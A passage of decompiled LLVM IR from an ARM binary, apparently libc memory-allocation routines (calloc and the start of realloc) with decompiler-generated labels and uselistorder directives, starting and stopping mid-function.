  uselistorder i32 %v2_1341c, { 1, 0, 2 }
  uselistorder i32 %v3_133d4, { 2, 1, 0 }
  uselistorder i32 %v0_133c4, { 3, 2, 1, 0 }
  uselistorder i32 %v0_13394, { 1, 0 }
  uselistorder i32 %v1_13348, { 2, 1, 0, 3 }
  uselistorder i32 %v0_13344, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_132e8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_132dc, { 1, 0 }
  uselistorder i32 %v3_132ac, { 1, 0 }
  uselistorder i32 %v0_132a0, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_13280, { 0, 2, 1, 3 }
  uselistorder i1 %v7_13274, { 1, 0 }
  uselistorder i32 %v0_13244, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 45, 42, 43, 44, 46, 47, 48, 49, 1, 2, 50, 51, 52, 53, 54, 55, 56, 57, 58, 63, 59, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 83, 91, 78, 79, 80, 81, 82, 84, 85, 86, 87, 0, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 28, 2, 4, 5, 6, 18, 10, 7, 19, 8, 9, 12, 11, 16, 13, 20, 15, 14, 21, 17, 25, 23, 22, 24, 27, 26, 29, 34, 30, 31, 0, 32, 33, 35, 36, 37, 40, 41, 38, 39, 46, 43, 42, 44, 45, 47, 52, 48, 49, 50, 51, 54, 53, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 22, 23, 34, 33, 41, 24, 42, 25, 26, 27, 28, 29, 30, 31, 32, 35, 36, 37, 38, 39, 40 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_13aec, { 1, 0 }
  uselistorder label %dec_label_pc_13ad0, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_13acc, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_13ab4, { 1, 2, 0 }
  uselistorder label %bb172, { 1, 0 }
  uselistorder label %bb170, { 1, 0 }
  uselistorder label %dec_label_pc_13a48, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_139c4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_139bc, { 1, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %.thread48, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread44, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_13890, { 1, 0 }
  uselistorder label %.thread36, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_137c4, { 2, 0, 3, 1 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %.thread31, { 1, 0 }
  uselistorder label %dec_label_pc_1367c, { 0, 2, 1 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_135d0, { 1, 0 }
  uselistorder label %dec_label_pc_135d8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1359c, { 1, 0 }
  uselistorder label %dec_label_pc_13550, { 1, 0 }
  uselistorder label %dec_label_pc_134e4, { 1, 0 }
  uselistorder label %dec_label_pc_134e0, { 1, 0 }
  uselistorder label %dec_label_pc_1348c, { 1, 0 }
  uselistorder label %dec_label_pc_13478, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13440, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1342c, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
}

define i32 @function_13b00(i32 %arg1) local_unnamed_addr {
dec_label_pc_13b00:
  %v0_13b00 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13b00, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_13b00
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_13b00, %bb
  %v4_13b1c = phi i32 [ %arg1, %dec_label_pc_13b00 ], [ 0, %bb ]
  ret i32 %v4_13b1c

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_13b20 = load i32, i32* @r4, align 4
  %v6_13b20 = load i32, i32* @r5, align 4
  %v9_13b20 = load i32, i32* @r6, align 4
  %v12_13b20 = load i32, i32* @lr, align 4
  %v2_13b28 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_13b38 = mul i32 %arg2, %arg1
  store i32 %v2_13b38, i32* @r6, align 4
  br i1 %v2_13b28, label %dec_label_pc_13b70, label %dec_label_pc_13b40

dec_label_pc_13b40:                               ; preds = %entry
  store i32 %arg1, i32* @r1, align 4
  %v2_13b48 = udiv i32 %v2_13b38, %arg1
  %v9_13b4c = icmp eq i32 %v2_13b48, %arg2
  br i1 %v9_13b4c, label %dec_label_pc_13b70, label %dec_label_pc_13b54

dec_label_pc_13b54:                               ; preds = %dec_label_pc_13b40
  %v0_13b58 = call i32 @__aeabi_read_tp()
  %v3_13b5c = load i16, i16* @global_var_23068.362, align 2
  %v4_13b5c = sext i16 %v3_13b5c to i32
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_13b68 = add i32 %v4_13b5c, %v0_13b58
  %v4_13b68 = inttoptr i32 %v3_13b68 to i32*
  store i32 12, i32* %v4_13b68, align 4
  br label %dec_label_pc_13c34

dec_label_pc_13b70:                               ; preds = %dec_label_pc_13b40, %entry
  %v4_13b74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 108) to i32*), align 4
  store i32 %v4_13b74, i32* @r4, align 4
  %v4_13b8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 112) to i32*), align 4
  store i32 %v4_13b8c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13b8c)
  %v0_13ba0 = load i32, i32* @r5, align 4
  %v2_13ba0 = add i32 %v0_13ba0, 16
  %v3_13ba0 = inttoptr i32 %v2_13ba0 to i32*
  %v4_13ba0 = load i32, i32* %v3_13ba0, align 4
  store i32 %v4_13ba0, i32* %ip.global-to-local, align 4
  store i32 80812, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13ba0)
  %v0_13bac = load i32, i32* @r6, align 4
  store i32 %v0_13bac, i32* @r0, align 4
  %v0_13bb0 = call i32 @malloc()
  store i32 %v0_13bb0, i32* %r4.global-to-local, align 4
  %v2_13bb4 = icmp eq i32 %v0_13bb0, 0
  br i1 %v2_13bb4, label %.thread, label %dec_label_pc_13bbc

dec_label_pc_13bbc:                               ; preds = %dec_label_pc_13b70
  %v1_13bbc = add i32 %v0_13bb0, -4
  %v2_13bbc = inttoptr i32 %v1_13bbc to i32*
  %v3_13bbc = load i32, i32* %v2_13bbc, align 4
  %v1_13bc0 = and i32 %v3_13bbc, 2
  %v2_13bc0 = icmp eq i32 %v1_13bc0, 0
  br i1 %v2_13bc0, label %dec_label_pc_13bc8, label %.thread

dec_label_pc_13bc8:                               ; preds = %dec_label_pc_13bbc
  %v1_13bc86 = add i32 %v3_13bbc, -4
  %v1_13bcc = and i32 %v1_13bc86, -4
  %v3_13bd0 = udiv i32 %v1_13bcc, 4
  store i32 %v3_13bd0, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_13bcc, 36
  %v2_13bd8 = icmp ult i32 %v1_13bcc, 33
  %v3_13bd8 = or i1 %tmp, %v2_13bd8
  br i1 %v3_13bd8, label %dec_label_pc_13be4, label %dec_label_pc_13bdc

dec_label_pc_13bdc:                               ; preds = %dec_label_pc_13bc8
  %v3_13bdc = inttoptr i32 %v0_13bb0 to i8*
  %v4_13bdc = call i32 @__GI_memset(i8* %v3_13bdc, i32 0, i32 %v1_13bcc)
  br label %.thread

dec_label_pc_13be4:                               ; preds = %dec_label_pc_13bc8
  %tmp7 = icmp eq i32 %v1_13bcc, 16
  %v2_13be8 = inttoptr i32 %v0_13bb0 to i32*
  store i32 0, i32* %v2_13be8, align 4
  %v1_13bec = load i32, i32* %r4.global-to-local, align 4
  %v2_13bec = add i32 %v1_13bec, 4
  %v3_13bec = inttoptr i32 %v2_13bec to i32*
  store i32 0, i32* %v3_13bec, align 4
  %v1_13bf0 = load i32, i32* %r4.global-to-local, align 4
  %v2_13bf0 = add i32 %v1_13bf0, 8
  %v3_13bf0 = inttoptr i32 %v2_13bf0 to i32*
  store i32 0, i32* %v3_13bf0, align 4
  %v2_13bf4 = icmp ult i32 %v1_13bcc, 13
  %v3_13bf4 = or i1 %tmp7, %v2_13bf4
  br i1 %v3_13bf4, label %.thread, label %dec_label_pc_13bf8

dec_label_pc_13bf8:                               ; preds = %dec_label_pc_13be4
  %v0_13bf8 = load i32, i32* %ip.global-to-local, align 4
  %v1_13bfc = load i32, i32* %r4.global-to-local, align 4
  %v2_13bfc = add i32 %v1_13bfc, 12
  %v3_13bfc = inttoptr i32 %v2_13bfc to i32*
  store i32 0, i32* %v3_13bfc, align 4
  %v1_13c00 = load i32, i32* %r4.global-to-local, align 4
  %v2_13c00 = add i32 %v1_13c00, 16
  %v3_13c00 = inttoptr i32 %v2_13c00 to i32*
  store i32 0, i32* %v3_13c00, align 4
  %tmp8 = icmp ult i32 %v0_13bf8, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_13c08

dec_label_pc_13c08:                               ; preds = %dec_label_pc_13bf8
  %v0_13c08 = load i32, i32* %ip.global-to-local, align 4
  %v7_13c08 = icmp eq i32 %v0_13c08, 9
  %v1_13c0c = load i32, i32* %r4.global-to-local, align 4
  %v2_13c0c = add i32 %v1_13c0c, 20
  %v3_13c0c = inttoptr i32 %v2_13c0c to i32*
  store i32 0, i32* %v3_13c0c, align 4
  %v1_13c10 = load i32, i32* %r4.global-to-local, align 4
  %v2_13c10 = add i32 %v1_13c10, 24
  %v3_13c10 = inttoptr i32 %v2_13c10 to i32*
  store i32 0, i32* %v3_13c10, align 4
  br i1 %v7_13c08, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13c08
  %v2_13c14 = load i32, i32* %r4.global-to-local, align 4
  %v3_13c14 = add i32 %v2_13c14, 32
  %v4_13c14 = inttoptr i32 %v3_13c14 to i32*
  store i32 0, i32* %v4_13c14, align 4
  %v2_13c18 = load i32, i32* %r4.global-to-local, align 4
  %v3_13c18 = add i32 %v2_13c18, 28
  %v4_13c18 = inttoptr i32 %v3_13c18 to i32*
  store i32 0, i32* %v4_13c18, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13c08, %dec_label_pc_13bbc, %dec_label_pc_13bf8, %dec_label_pc_13be4, %dec_label_pc_13b70, %dec_label_pc_13bdc, %bb
  store i32 1, i32* @r1, align 4
  %v0_13c28 = load i32, i32* @r5, align 4
  %v2_13c28 = add i32 %v0_13c28, 44
  %v3_13c28 = inttoptr i32 %v2_13c28 to i32*
  %v4_13c28 = load i32, i32* %v3_13c28, align 4
  store i32 %v4_13c28, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13c28)
  br label %dec_label_pc_13c34

dec_label_pc_13c34:                               ; preds = %dec_label_pc_13b54, %.thread
  %v0_13c34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_13b20, i32* @r4, align 4
  store i32 %v6_13b20, i32* @r5, align 4
  store i32 %v9_13b20, i32* @r6, align 4
  store i32 %v12_13b20, i32* @lr, align 4
  ret i32 %v0_13c34

; uselistorder directives
  uselistorder i32 %v1_13bcc, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v0_13bb0, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 33, { 0, 6, 5, 7, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_13c34, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_13c60 = load i32, i32* @r4, align 4
  %v6_13c60 = load i32, i32* @r5, align 4
  %v9_13c60 = load i32, i32* @r6, align 4
  %v12_13c60 = load i32, i32* @r7, align 4
  %v15_13c60 = load i32, i32* @r8, align 4
  %v18_13c60 = load i32, i32* @sb, align 4
  %v21_13c60 = load i32, i32* @sl, align 4
  %v24_13c60 = load i32, i32* @fp, align 4
  %v27_13c60 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_13c6c = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_13c6c, label %dec_label_pc_13c80, label %dec_label_pc_13c90

dec_label_pc_13c80:                               ; preds = %entry
  store i32 %arg2, i32* @r0, align 4
  %v0_13c84 = call i32 @malloc()
  store i32 %v0_13c84, i32* %r0.global-to-local, align 4
  store i32 %v0_13c84, i32* @r4, align 4
  br label %dec_label_pc_13ff0

dec_label_pc_13c90:                               ; preds = %entry
  %v2_13c90 = icmp eq i32 %arg2, 0
  br i1 %v2_13c90, label %dec_label_pc_13c98, label %dec_label_pc_13ca4

dec_label_pc_13c98:                               ; preds = %dec_label_pc_13c90
  %v0_13c98 = call i32 @free()
  store i32 %v0_13c98, i32* %r0.global-to-local, align 4
  %v0_13c9c = load i32, i32* @r6, align 4
  store i32 %v0_13c9c, i32* @r4, align 4
  br label %dec_label_pc_13ff0

dec_label_pc_13ca4:                               ; preds = %dec_label_pc_13c90
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_13cac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 108) to i32*), align 4
  store i32 %v4_13cac, i32* @r4, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_13cac, i32* %r2.global-to-local, align 4
  %v4_13cb8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 68) to i32*), align 4
  store i32 %v4_13cb8, i32* %r1.global-to-local, align 4
  %v2_13cbc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_13cbc, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_13cc4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13cc4)
  %v0_13cd0 = load i32, i32* @r4, align 4
  store i32 %v0_13cd0, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r1.global-to-local, align 4
  %v4_13cdc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 16) to i32*), align 4
  store i32 ptrtoint (i32* @global_var_13ce8.470 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13cdc)
  %v0_13ce8 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_13ce8, -32
  br i1 %tmp36, label %dec_label_pc_13d0c, label %dec_label_pc_13cf0

dec_label_pc_13cf0:                               ; preds = %dec_label_pc_13ca4
  store i32 62312, i32* %r2.global-to-local, align 4
  %v0_13cf4 = call i32 @__aeabi_read_tp()
  store i32 %v0_13cf4, i32* %r0.global-to-local, align 4
  %v3_13cf8 = load i16, i16* @global_var_23068.362, align 2
  %v4_13cf8 = sext i16 %v3_13cf8 to i32
  store i32 %v4_13cf8, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_13d04 = add i32 %v4_13cf8, %v0_13cf4
  %v4_13d04 = inttoptr i32 %v3_13d04 to i32*
  store i32 12, i32* %v4_13d04, align 4
  br label %dec_label_pc_13ff0

dec_label_pc_13d0c:                               ; preds = %dec_label_pc_13ca4
  %v1_13d0c = add i32 %v0_13ce8, 11
  store i32 %v1_13d0c, i32* %r0.global-to-local, align 4
  %v0_13d10 = load i32, i32* @r5, align 4
  %v1_13d10 = add i32 %v0_13d10, -4
  %v2_13d10 = inttoptr i32 %v1_13d10 to i32*
  %v3_13d10 = load i32, i32* %v2_13d10, align 4
  store i32 %v3_13d10, i32* %r2.global-to-local, align 4
  %v2_13d14 = icmp ugt i32 %v1_13d0c, 14
  %v7_13d14 = icmp eq i32 %v1_13d0c, 15
  %v2_13d18 = xor i1 %v2_13d14, true
  %v3_13d18 = or i1 %v7_13d14, %v2_13d18
  br i1 %v3_13d18, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_13d0c
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_13d0c, %bb
  %v2_13d1c = xor i1 %v7_13d14, true
  %v3_13d1c = and i1 %v2_13d14, %v2_13d1c
  br i1 %v3_13d1c, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_13d1c = and i32 %v1_13d0c, -8
  store i32 %v5_13d1c, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_13d20 = and i32 %v3_13d10, 2
  %v2_13d20 = icmp eq i32 %v1_13d20, 0
  %v1_13d24 = add i32 %v0_13d10, -8
  store i32 %v1_13d24, i32* @sl, align 4
  %v1_13d28 = and i32 %v3_13d10, -4
  store i32 %v1_13d28, i32* @r6, align 4
  br i1 %v2_13d20, label %dec_label_pc_13d30, label %dec_label_pc_13f08

dec_label_pc_13d30:                               ; preds = %bb29
  %v1_13d30 = load i32, i32* @sb, align 4
  %v3_13d30 = icmp ult i32 %v1_13d28, %v1_13d30
  br i1 %v3_13d30, label %dec_label_pc_13d3c, label %bb30

bb30:                                             ; preds = %dec_label_pc_13d30
  store i32 %v1_13d28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13ea0

dec_label_pc_13d3c:                               ; preds = %dec_label_pc_13d30
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_13d44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), align 4
  store i32 %v4_13d44, i32* %r0.global-to-local, align 4
  %v1_13d48 = add i32 %v4_13d44, 44
  %v2_13d48 = inttoptr i32 %v1_13d48 to i32*
  %v3_13d48 = load i32, i32* %v2_13d48, align 4
  store i32 %v3_13d48, i32* %r3.global-to-local, align 4
  %v2_13d4c = add i32 %v1_13d28, %v1_13d24
  store i32 %v2_13d4c, i32* @r4, align 4
  %v9_13d50 = icmp eq i32 %v2_13d4c, %v3_13d48
  %v1_13d54 = add i32 %v2_13d4c, 4
  %v2_13d54 = inttoptr i32 %v1_13d54 to i32*
  %v3_13d54 = load i32, i32* %v2_13d54, align 4
  store i32 %v3_13d54, i32* %r1.global-to-local, align 4
  br i1 %v9_13d50, label %dec_label_pc_13d5c, label %dec_label_pc_13d98

dec_label_pc_13d5c:                               ; preds = %dec_label_pc_13d3c
  %v1_13d5c = and i32 %v3_13d54, -4
  %v2_13d60 = add i32 %v1_13d5c, %v1_13d28
  store i32 %v2_13d60, i32* %r1.global-to-local, align 4
  %v1_13d64 = add i32 %v1_13d30, 16
  store i32 %v1_13d64, i32* %r3.global-to-local, align 4
  %v3_13d68 = icmp ult i32 %v2_13d60, %v1_13d64
  br i1 %v3_13d68, label %dec_label_pc_13dec, label %dec_label_pc_13d70

dec_label_pc_13d70:                               ; preds = %dec_label_pc_13d5c
  %v2_13d70 = sub i32 %v2_13d60, %v1_13d30
  %v1_13d74 = urem i32 %v3_13d10, 2
  %v2_13d78 = add i32 %v1_13d30, %v1_13d24
  store i32 %v2_13d78, i32* %r1.global-to-local, align 4
  %v2_13d7c = or i32 %v1_13d30, %v1_13d74
  store i32 %v2_13d7c, i32* %r2.global-to-local, align 4
  %v1_13d80 = or i32 %v2_13d70, 1
  store i32 %v1_13d80, i32* %r3.global-to-local, align 4
  store i32 %v0_13d10, i32* @r4, align 4
  store i32 %v2_13d7c, i32* %v2_13d10, align 4
  %v0_13d8c = load i32, i32* %r1.global-to-local, align 4
  %v1_13d8c = load i32, i32* %r0.global-to-local, align 4
  %v2_13d8c = add i32 %v1_13d8c, 44
  %v3_13d8c = inttoptr i32 %v2_13d8c to i32*
  store i32 %v0_13d8c, i32* %v3_13d8c, align 4
  %v0_13d90 = load i32, i32* %r3.global-to-local, align 4
  %v1_13d90 = load i32, i32* %r1.global-to-local, align 4
  %v2_13d90 = add i32 %v1_13d90, 4
  %v3_13d90 = inttoptr i32 %v2_13d90 to i32*
  store i32 %v0_13d90, i32* %v3_13d90, align 4
  br label %dec_label_pc_13fd4

dec_label_pc_13d98:                               ; preds = %dec_label_pc_13d3c
  %v1_13d98 = and i32 %v3_13d54, -2
  %v2_13d9c = add i32 %v1_13d98, %v2_13d4c
  store i32 %v2_13d9c, i32* %r3.global-to-local, align 4
  %v1_13da0 = add i32 %v2_13d9c, 4
  %v2_13da0 = inttoptr i32 %v1_13da0 to i32*
  %v3_13da0 = load i32, i32* %v2_13da0, align 4
  store i32 %v3_13da0, i32* %r3.global-to-local, align 4
  %v1_13da4 = urem i32 %v3_13da0, 2
  %v2_13da4 = icmp eq i32 %v1_13da4, 0
  br i1 %v2_13da4, label %dec_label_pc_13dac, label %dec_label_pc_13dec

dec_label_pc_13dac:                               ; preds = %dec_label_pc_13d98
  %v1_13dac = and i32 %v3_13d54, -4
  store i32 %v1_13dac, i32* %r3.global-to-local, align 4
  %v2_13db0 = add i32 %v1_13dac, %v1_13d28
  store i32 %v2_13db0, i32* %r0.global-to-local, align 4
  %v3_13db4 = icmp ult i32 %v2_13db0, %v1_13d30
  br i1 %v3_13db4, label %dec_label_pc_13dec, label %dec_label_pc_13dbc

dec_label_pc_13dbc:                               ; preds = %dec_label_pc_13dac
  %v1_13dbc = add i32 %v1_13d28, %v0_13d10
  %v2_13dbc = inttoptr i32 %v1_13dbc to i32*
  %v3_13dbc = load i32, i32* %v2_13dbc, align 4
  store i32 %v3_13dbc, i32* %r1.global-to-local, align 4
  %v1_13dc0 = add i32 %v3_13dbc, 12
  %v2_13dc0 = inttoptr i32 %v1_13dc0 to i32*
  %v3_13dc0 = load i32, i32* %v2_13dc0, align 4
  store i32 %v3_13dc0, i32* %r3.global-to-local, align 4
  %v9_13dc4 = icmp eq i32 %v3_13dc0, %v2_13d4c
  %v1_13dc8 = add i32 %v2_13d4c, 12
  %v2_13dc8 = inttoptr i32 %v1_13dc8 to i32*
  %v3_13dc8 = load i32, i32* %v2_13dc8, align 4
  store i32 %v3_13dc8, i32* %r2.global-to-local, align 4
  br i1 %v9_13dc4, label %dec_label_pc_13dd0, label %dec_label_pc_13ddc

dec_label_pc_13dd0:                               ; preds = %dec_label_pc_13dbc
  %v1_13dd0 = add i32 %v3_13dc8, 8
  %v2_13dd0 = inttoptr i32 %v1_13dd0 to i32*
  %v3_13dd0 = load i32, i32* %v2_13dd0, align 4
  store i32 %v3_13dd0, i32* %r3.global-to-local, align 4
  %v9_13dd4 = icmp eq i32 %v3_13dd0, %v2_13d4c
  br i1 %v9_13dd4, label %dec_label_pc_13de0, label %dec_label_pc_13ddc

dec_label_pc_13ddc:                               ; preds = %dec_label_pc_13dbc, %dec_label_pc_13dd0
  %v0_13ddc = call i32 @abort()
  store i32 %v0_13ddc, i32* %r0.global-to-local, align 4
  %v0_13de0.pre = load i32, i32* @r1, align 4
  %v1_13de0.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_13de0

dec_label_pc_13de0:                               ; preds = %dec_label_pc_13dd0, %dec_label_pc_13ddc
  %v1_13de0 = phi i32 [ %v3_13dc8, %dec_label_pc_13dd0 ], [ %v1_13de0.pre, %dec_label_pc_13ddc ]
  %v0_13de0 = phi i32 [ %v3_13dbc, %dec_label_pc_13dd0 ], [ %v0_13de0.pre, %dec_label_pc_13ddc ]
  %v2_13de0 = add i32 %v1_13de0, 8
  %v3_13de0 = inttoptr i32 %v2_13de0 to i32*
  store i32 %v0_13de0, i32* %v3_13de0, align 4
  %v0_13de4 = load i32, i32* %r2.global-to-local, align 4
  %v1_13de4 = load i32, i32* %r1.global-to-local, align 4
  %v2_13de4 = add i32 %v1_13de4, 12
  %v3_13de4 = inttoptr i32 %v2_13de4 to i32*
  store i32 %v0_13de4, i32* %v3_13de4, align 4
  %v1_13ea0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13ea0

dec_label_pc_13dec:                               ; preds = %dec_label_pc_13d5c, %dec_label_pc_13dac, %dec_label_pc_13d98
  %v1_13dec = add i32 %v1_13d30, -7
  store i32 %v1_13dec, i32* @r0, align 4
  %v0_13df0 = call i32 @malloc()
  store i32 %v0_13df0, i32* @r0, align 4
  store i32 %v0_13df0, i32* %r1.global-to-local, align 4
  %v2_13df4 = icmp eq i32 %v0_13df0, 0
  br i1 %v2_13df4, label %bb31, label %dec_label_pc_13e00

bb31:                                             ; preds = %dec_label_pc_13dec
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_13fd4

dec_label_pc_13e00:                               ; preds = %dec_label_pc_13dec
  %v1_13e08.pre = load i32, i32* @r4, align 4
  %v1_13e00 = add i32 %v0_13df0, -4
  %v2_13e00 = inttoptr i32 %v1_13e00 to i32*
  %v3_13e00 = load i32, i32* %v2_13e00, align 4
  store i32 %v3_13e00, i32* @r3, align 4
  %v1_13e04 = add i32 %v0_13df0, -8
  store i32 %v1_13e04, i32* @r7, align 4
  %v9_13e08 = icmp eq i32 %v1_13e04, %v1_13e08.pre
  br i1 %v9_13e08, label %.thread2, label %dec_label_pc_13e18

.thread2:                                         ; preds = %dec_label_pc_13e00
  %v2_13e0c = and i32 %v3_13e00, -4
  store i32 %v2_13e0c, i32* %r3.global-to-local, align 4
  %v2_13e10 = load i32, i32* @r6, align 4
  %v3_13e10 = add i32 %v2_13e10, %v2_13e0c
  store i32 %v3_13e10, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13ea0

dec_label_pc_13e18:                               ; preds = %dec_label_pc_13e00
  %v0_13e18 = load i32, i32* @r6, align 4
  %v1_13e18 = add i32 %v0_13e18, -4
  store i32 %v1_13e18, i32* @r2, align 4
  %v3_13e1c = udiv i32 %v1_13e18, 4
  store i32 %v3_13e1c, i32* @ip, align 4
  %tmp37 = and i32 %v1_13e18, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_13e24 = icmp ult i32 %v1_13e18, 36
  %v3_13e24 = or i1 %tmp38, %v2_13e24
  %v0_13e34 = load i32, i32* @r5, align 4
  br i1 %v3_13e24, label %dec_label_pc_13e34, label %dec_label_pc_13e28

dec_label_pc_13e28:                               ; preds = %dec_label_pc_13e18
  store i32 %v0_13e34, i32* @r1, align 4
  %v0_13e2c = call i32 @memcpy()
  store i32 %v0_13e2c, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_13e34:                               ; preds = %dec_label_pc_13e18
  %v1_13e34 = inttoptr i32 %v0_13e34 to i32*
  %v2_13e34 = load i32, i32* %v1_13e34, align 4
